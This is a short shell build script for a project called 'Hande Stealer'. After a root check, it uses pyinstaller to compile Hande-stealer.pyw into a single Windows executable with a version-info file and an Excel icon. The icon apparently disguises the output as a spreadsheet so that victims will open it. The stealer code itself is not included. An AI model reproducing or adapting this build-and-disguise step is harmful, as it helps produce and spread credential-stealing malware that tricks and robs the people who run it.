#!/bin/sh

echo "Hande Stealer"
if test "`whoami`" != "root" ; then
	echo "You must be logged in as root to build (for loopback mounting)"
	echo "Enter 'su' or 'sudo bash' to switch to root"
	exit
fi

echo "Compiling Windows executable..."
sudo pyinstaller --clean --onefile --version-file file_version.txt --icon="excel.ico" Hande-stealer.pyw
echo "Done!"
